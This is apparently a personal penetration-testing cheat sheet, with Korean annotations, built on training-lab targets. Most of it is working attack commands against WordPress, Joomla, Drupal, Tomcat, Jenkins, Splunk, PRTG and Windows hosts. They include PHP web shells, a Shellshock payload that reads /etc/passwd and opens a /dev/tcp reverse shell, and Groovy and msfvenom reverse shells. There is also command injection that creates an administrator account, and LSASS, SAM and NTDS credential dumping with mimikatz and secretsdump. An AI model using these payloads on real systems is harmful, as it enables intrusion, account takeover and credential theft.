<details>
  <summary><strong>CHECK</strong></summary>
  
```
web - whatweb/curl/burpsuite crawler/all html code
sql - injection/connect/enumeration/update
ftp - upload/download/hidden files
windows - powershell history/whoami/inside files(password leaking,source code,configurations)/responder-ntlm/
linux - inside files(password leaking,source code,configurations)

nmap - `-sU --top-ports 100`
ffuf - `mc all`
```

</details>

---
<details>
<summary><strong>awscli</strong></summary>
  
```bash
aws configure

aws s3 --endpoint-url=http://s3.thetoppers.htb ls

aws s3 --endpoint-url=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php .

aws s3 --endpoint-url=http://s3.thetoppers.htb cp ex.php s3://thetoppers.htb
```

</details>

---

<details>
  <summary><strong>Application Attack</strong></summary>

## Enumeration
```bash
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

sudo nmap --open -sV 10.129.201.50

eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

## Wordpress
```bash
curl http://<wordpress>/robots.txt

curl http://<wordpress>/wp-login.php

curl http://<wordpress> | grep -i wordpress

curl http://<wordpress> | grep themes

curl http://<wordpress> | grep plugins

curl http://<wordpress>/?p=1 | grep plugins
```
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token>

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
### RCE
- `Appearance > Theme Editor`
<img width="1461" height="868" alt="image" src="https://github.com/user-attachments/assets/b72d9500-b5f0-45af-b05f-6485d08a04bf" />

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

## joomla
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla

curl -s http://dev.inlanefreight.local/README.txt | head -n 5

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
```bash
git clone https://github.com/drego85/JoomlaScan

python2.7 joomlascan.py -u http://dev.inlanefreight.local
```
```bash
git clone https://github.com/ajnik/joomla-bruteforce

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
### RCE
- `CONFIGURATION > Templates`
<img width="1461" height="935" alt="image" src="https://github.com/user-attachments/assets/aaf319ac-3d97-461d-a49f-38f09c07685e" />

## Drupal
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal

curl -s http://drupal.inlanefreight.local/node/<nodeid>

# Old Version
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

### RCE
#### Older Version
- 로그인 이후 상단
- `Modules > PHP Filter` check
- `Content > Add Content > Basic page`
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
#### Latest Version
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- `Administration > Reports > Available updates > Install`
- `Content > Basic page`
#### Upload Module
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar xvf captcha-8.x-1.2.tar.gz
```
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
- `.htaccess`
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
```bash
mv shell.php .htaccess captcha

tar cvf captcha.tar.gz captcha/
```
- `Manage > Install new module > Install`
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## TOMCAT
```bash
curl http://app-dev.inlanefreight.local:8080/invalid

curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```
- `tomcat-users.xml`
```bash
git clone https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce

python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```
### RCE
- `http://web01.inlanefreight.local:8180/manager/html > deploy war file`
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

### CGI
- `enableCmdLineArguments` feature enabled
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
- `http://10.129.204.227:8080/cgi/welcome.bat?&dir`
- `http://10.129.204.227:8080/cgi/welcome.bat?&set`
- `http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
- `http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

#### ShellShock
```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

## Jenkins
- `http://jenkins.inlanefreight.local:8000/script`
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Splunk
- `nmap` 스캔으로 발견됨.
```bash
git clone https://github.com/0xjpuff/reverse_shell_splunk

tar -cvzf updater.tar.gz splunk_shell/
```
- `Apps > Install app from file`

## PRTG Network Monitor
- `nmap` 스캔으로 발견됨.
- `https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/`
- `setup > account settings > Notifications`
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

## osTicket
- `support portal`에서 새로운 티켓을 요청할 수 있으면 기업에서 사용하는 `email`로 생성이 가능할 수 있다.
<img width="1481" height="534" alt="image" src="https://github.com/user-attachments/assets/d92a174c-3f84-40d4-9215-0fa2a18060be" />
<img width="1467" height="968" alt="image" src="https://github.com/user-attachments/assets/ae03cd98-18c5-4c8b-aa23-9f3826447f67" />

## Gitlab
- `http://gitlab.inlanefreight.local:8081/explore`
```bash
git clone https://github.com/dpgg101/GitLabUserEnum

./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

## ColdFusion(8500)
```bash
nmap -p- -sC -Pn 10.129.247.30 --open
```
<img width="1005" height="469" alt="image" src="https://github.com/user-attachments/assets/5a7eca71-d4cf-4c5d-94a1-5c155ccebacd" />

## IIS(8.3 format enabled)
```
http://example.com/~s
http://example.com/~se
http://example.com/~sec
...
http://example.com/secret~1/somefi~1.txt
```
```bash
git clone https://github.com/irsdl/IIS-ShortName-Scanner

java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

</details>

---
<details>
  <summary><strong>TTY</strong></summary>

```bash
/usr/bin/script -qc /bin/bash
```
</details>

---
<details>
  <summary><strong>LDAP(389)</strong></summary>
  
```bash
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```
  
</details>

---
<details>
  <summary><strong>mongosh</strong></summary>

```
mongosh --host 10.129.5.3

test> show dbs;

test> use sensitive_information;

sensitive_information> show collections;

sensitive_information> db.flag.find()

ace> db.admin.updateOne({name:'administrator'},{$set:{x_shadow:'$6$MAQvinWPLqmiLt9t$axLwiLf0fW7Ln60XYQoe2wwy1AbTMMXZw6mHB0vGRdVvPAXqIn9v4kPJiuYYwkrKvLzvhmwzbr0FbO6vRKFzT/'}});
```

</details>

---
<details>
  <summary><strong>PHP</strong></summary>

```php
if (strcmp($username, $_POST['username']) == 0)
```
- `strcmp`함수가 같은 값이면 0을 반환.
- PHP에서 파라미터를 제대로 검사하지 않으면 array를 전달할 수 있게 됨.(username=value 대신에 username[]=value)
- NULL 값은 0
<img width="775" height="372" alt="image" src="https://github.com/user-attachments/assets/8cfd0a24-61ef-425f-8354-9d05d5c0c5e8" />

</details>

---
<details>
  <summary><strong>Windows Privesc</strong></summary>
  
## SeDebugPrivilege
- `Task Manager > Details > choose LSASS > right click > Create dump file`
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
mimikatz.exe

log

sekurlsa::minidump lsass.dmp

sekurlsa::logonpasswords
```

- `https://github.com/decoder-it/psgetsystem`
```powershell
. .\psgetsys.ps1

ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```

## SeTakeOwnershipPrivilege
- `https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`
```powershell
Import-Module .\Enable-Privilege.ps1

.\EnableAllTokenPrivs.ps1

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

takeown /f 'C:\Department Shares\Private\IT\cred.txt'

Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

## Backup Operators group
```
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

robocopy /B E:\Windows\NTDS .\ntds ntds.dit

reg save HKLM\SYSTEM system

reg save HKLM\SAM sam
```
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```


</details>
